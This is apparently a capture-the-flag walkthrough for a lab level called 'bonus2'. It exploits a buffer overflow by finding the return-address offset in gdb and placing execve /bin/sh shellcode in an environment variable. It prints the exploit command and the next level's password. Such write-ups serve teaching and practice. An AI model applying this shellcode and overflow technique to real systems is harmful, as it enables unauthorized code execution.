# Bonus 02 Walkthrough

## Binary analysis

The binary is vulnerable to a buffer overflow. By overflowing the buffer, we can overwrite the return address and redirect execution to shellcode placed in an environment variable, similar to previous levels. The offset to the return address is 23 bytes into the second argument.

## Exploitation

By browsing the code, we noticed we have two ways of overflowing up to the return address:
```
export LANG="nl"
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```
or
```
export LANG="fi"
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

With gdb and a cyclic pattern for the first method, we find the offset (23 bytes) to the return address.
```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
(gdb) p/x $eip
$1 = 0x38614137
```

We export the shellcode in an environment variable.
```bash
export SC=$(python -c 'print(b"\x90"*5000 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
```

We find the address of the shellcode in the environment (using gdb and `x/2000s (char **)environ`).
```
(gdb) x/2000s (char **)environ
```

We overflow the buffer and overwrite the return address with the address of the shellcode:
```bash
./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 23 + "\xe6\xfe\xff\xbf"[::-1])')
```

## Commands used

```
./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 23 + "\xe6\xfe\xff\xbf"[::-1])')
cat /home/user/bonus3/.pass
```

## Result

After running the exploit, we get a shell as bonus3 and can read the password:

```
cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
